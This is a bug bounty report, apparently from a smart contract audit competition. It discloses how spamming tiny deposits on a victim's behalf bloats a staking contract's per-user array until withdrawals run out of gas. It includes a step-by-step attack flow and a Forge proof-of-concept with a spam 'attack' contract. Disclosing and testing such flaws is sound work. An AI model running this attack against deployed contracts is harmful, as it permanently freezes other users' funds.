# 57766 sc medium attacker can permanently lock any user s funds

**Submitted on Oct 28th 2025 at 19:10:02 UTC by @danial for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57766
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

### Brief / Intro

The `Staking` contract allows attackers to deposit on behalf of any address and each deposit creates a new locked Stake entry in a per-user array. An attacker can spam thousands of tiny deposits for a victim so the victim’s `stakes[victim]` array becomes huge. Both normal withdraw and the emergency withdraw flows iterate that array; when it’s big enough the calls will run out of gas and revert. Result: victim’s funds become permanently locked.

### Vulnerability Details

Anyone can deposit on behalf of any address in `deposit()` from `ERC4626`:

```solidity
function deposit(uint256 assets, address to) public virtual returns (uint256 shares) {
    if (assets > maxDeposit(to)) _revert(0xb3c61a83); // `DepositMoreThanMax()`.
    shares = previewDeposit(assets);
    _deposit(msg.sender, to, assets, shares);
}
```

From `_deposit()` every deposit pushes a new stake entry:

```solidity
function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
    super._deposit(by, to, assets, shares);
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

The `_consumeUnlockedSharesOrRevert()` iterates the whole array:

```solidity
function _consumeUnlockedSharesOrRevert(address staker, uint256 need) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 _min = minStakePeriod;
    uint256 nowTs = block.timestamp;
    uint256 remaining = need;

    for (uint256 i; i < userStakes.length && remaining > 0;) {
        Stake memory s = userStakes[i];
        if (nowTs >= s.timestamp + _min) {
            uint256 take = s.shares <= remaining ? s.shares : remaining;
            if (take == s.shares) {
                // full consume → swap and pop
                remaining -= take;
                userStakes[i] = userStakes[userStakes.length - 1];
                userStakes.pop();
                // don't ++i: a new element is now at index i
            } else {
                // partial consume
                userStakes[i].shares = s.shares - take;
                remaining = 0;
                unchecked {
                    ++i;
                }
            }
        } else {
            unchecked {
                ++i;
            }
        }
    }

    if (remaining != 0) revert MinStakePeriodNotMet();
}
```

The `_removeAnySharesFor()` also iterates the whole array:

```solidity
function _removeAnySharesFor(address staker, uint256 shares) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 remaining = shares;

    for (uint256 i; i < userStakes.length && remaining > 0;) {
        uint256 stakeShares = userStakes[i].shares;
        if (stakeShares <= remaining) {
            remaining -= stakeShares;
            userStakes[i] = userStakes[userStakes.length - 1];
            userStakes.pop();
            // don't ++i: a new element is now at index i
        } else {
            userStakes[i].shares = stakeShares - remaining;
            remaining = 0;
            unchecked {
                ++i;
            }
        }
    }
}
```

{% stepper %}
{% step %}

### Attack flow — step-by-step

* Attacker calls `deposit(1, victim)` many times. `stakes[victim]` grows to N entries.
* Victim calls `deposit(100e18, victim)`. This pushes a new Stake entry into the array.
* Attacker spam deposits again M times to same victim. Victim’s honest deposit entry ends up sandwiched inside a much larger array.

Effect on withdraws:

* Normal withdraw uses `_consumeUnlockedSharesOrRevert()` which reads the whole stakes array and will revert due to out of gas when the array is large enough.
* Emergency withdraw calls `_removeAnySharesFor`, which also iterates and performs swap-and-pop; it too will revert when the array is large enough.
  {% endstep %}
  {% endstepper %}

### Impact Details

Critical: attacker can permanently block a user’s ability to withdraw their tokens at low attack cost (small deposits + gas).

## Proof of Concept

<details>

<summary>Click to expand PoC (Forge test)</summary>

Note: for simplicity, the PoC uses the `Staking` contract directly (not via proxy — comment the constructor in Staking.sol).

Run the test with: `forge test --fork-url https://bsc-dataseed1.binance.org`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";

contract ERC20Mock {
    string public name = "MockLONG";
    string public symbol = "mLONG";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amt);
    event Approval(address indexed owner, address indexed spender, uint256 amt);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insuff");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "from insuff");
        uint256 al = allowance[from][msg.sender];
        require(al >= amt, "allow insuff");
        allowance[from][msg.sender] = al - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

contract attack {

    Staking public target;
    ERC20Mock public token;

    constructor(address _stake, address _token) {
        target = Staking(_stake);
        token = ERC20Mock(_token);
    }

    function spam(uint256 times, address _victim) public{
        token.approve(address(target), times);
        for(uint i; i < times; i++){
            target.deposit(1, _victim);
        }
    }

}

contract pocTest is Test {
    Staking public staking;
    ERC20Mock public token;
    attack public attackerContract;

    address stakingOwner = makeAddr("stakingOwner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new ERC20Mock();
        staking = new Staking(); // for simplicity, we are not using proxy here (just comment the constructor in Staking.sol)
        attackerContract = new attack(address(staking), address(token));
        
        staking.initialize(address(stakingOwner), address(stakingOwner), address(token));
        vm.startPrank(stakingOwner);
        staking.setMinStakePeriod(1);
        vm.stopPrank();
        token.mint(victim, 100e18);
        token.mint(address(attackerContract), 100e18);
    }

    function test_spamDeposit() public{
        attackerContract.spam(8978, address(victim));

        vm.startPrank(victim);
        token.approve(address(staking), 100e18);
        staking.deposit(100e18, address(victim));
        vm.stopPrank();

        attackerContract.spam(8978, address(victim));

        vm.startPrank(victim);
        vm.warp(block.timestamp + 2);

        vm.expectRevert(bytes(""));
        staking.withdraw(100e18, address(victim), address(victim));
        
        vm.expectRevert(bytes(""));
        staking.emergencyWithdraw(100e18, address(victim), address(victim));
        vm.stopPrank();
    }
}
```

</details>
